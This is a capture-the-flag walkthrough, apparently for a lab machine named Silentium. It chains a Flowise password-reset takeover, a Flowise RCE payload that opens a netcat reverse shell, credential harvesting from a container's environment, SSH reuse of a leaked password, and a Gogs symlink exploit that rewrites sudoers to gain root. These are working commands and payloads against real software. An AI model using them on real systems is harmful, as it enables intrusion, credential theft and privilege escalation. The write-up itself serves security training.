# Silentium
## Enumeration
### Nmap
Start with a quick scan
```bash
nmap -sV -T4 <IP> -o nmap-silentium.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's add `silentium.htb` to our `/etc/hosts`.
After `fuzzing` for `VHOSTS`, I found a `staging` VHOST, so we also need to add it to our `/etc/hosts`.  
After opening up the `staging` VHOST we see that it's powered by `FLOWISE`.  
A few google searches later, we know that `FLOWISE` often exposes it's `API` so let's try and use that to find out the version  
```bash
curl -X GET http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```
We see that the `FLOWISE` version is `3.0.5`. This version is vulnerable to many different exploits (RCE, auth bypass, account takeover, and more)  
We will now use the [account takeover](https://github.com/advisories/GHSA-wgpv-6j63-x5ph) exploit.  
On `silentium.htb` we see three people `Marcus, Ben, Elena`. We can try all of them and we find that a user `ben@silentium.htb` exists.  
## Exploitation
```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
> -H "Content-Type: application/json" \
> -d '{"user":{"email":"ben@silentium.htb"}}'
```
After we get a response `201 Created`, We are interested in the `tempToken`:`"tempToken":"bDbFTsK7MSgcouWy6cLIACywtDr3AkQvxPC14pe8KMnJLqQAx8u4NtypSTMTHoMg"`  
Now we can reset ben's password:  
```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
> -H "Content-Type: application/json" \
> -d '{
>       "user":{
>         "email":"ben@silentium.htb",
>         "tempToken":"<YOUR-TEMPTOKEN>",
>         "password":"<YOUR-PASSWORD>"
>       }
>     }'
```
After we get a code `201 Created` we can login to `ben@silentium.htb` with our own password.  
## User
To get a rev shell, we need to execute [this](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) RCE exploit.  
First:
`nc -lvnp YOUR-PORT`
then:
```bash
nano payload.json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR-IP YOUR-PORT >/tmp/f');return 1;})()} )"
  }
}
```
We will need this file for this:
```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
> -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
> -H "Content-Type: application/json" \
> -d @payload.json
```
We should get a call to our listener and we are in.  
## Escaping Docker
We instantly see that we are inside a `Docker` container.  
Let's check environment variables as they are often exposed:
```bash
/home # cat /proc/1/environ | tr '\0' '\n'
FLOWISE_PASSWORD=F1l3_d0ck3r
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
SMTP_USERNAME=test
SMTP_SECURE=false
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
SECRETKEY_PATH=/root/.flowise
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
SMTP_USER=test
```
These are only the entries that seemed important.  
We can now `ssh` into `ben` using the password `r04D!!_R4ge`. 
```bash
ssh ben@silentium.htb
...
ben@silentium:~$ ls
user.txt
```
## ROOT
System enumeration showed that `gogs` is running (ports 3000/3001) and is vulnerable to [CVE-2025-8110](https://github.com/zAbuQasem/gogs-CVE-2025-8110)  
But the script did not work for me, so I decided to exploit this manually  
1. `ssh -L 8080:127.0.0.1:3001 ben@silentium.htb`
2. Go to `http://127.0.0.1:8080` and register a new account
3. Go to `User settings` > `Applications` and generate a new token
4. Create a new repository (initialize it)
5. Now we can create a symlink locally:
```bash
git clone http://127.0.0.1:8080/USERNAME/REPO_NAME.git
cd REPO_NAME
ln -s /etc/sudoers.d/ben malicious_symlink
git add malicious_symlink && git commit -m "Add malicious symlink" && git push
```
Note: you might have to use `git config --global user.email "email for gogs"` or `git config --global user.name "name for gogs"` to be able to push and commit.  
6. Now that our malicious symlink is ready, we can deliever the payload:
```bash
TOKEN="YOUR GOGS TOKEN"
USER="YOUR GOGS NAME"
REPO="YOUR GOGS REPO"
PAYLOAD=$(echo -n "ben ALL=(ALL) NOPASSWD:ALL" | base64)

curl -X PUT "http://127.0.0.1:8080/api/v1/repos/$USER/$REPO/contents/malicious_symlink" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"message\": \"update via symlink\",
    \"content\": \"$PAYLOAD\"
}"
```
7. After we successfully execute this we can go back to our `SSH` session as ben and do `sudo su` which makes us `root`

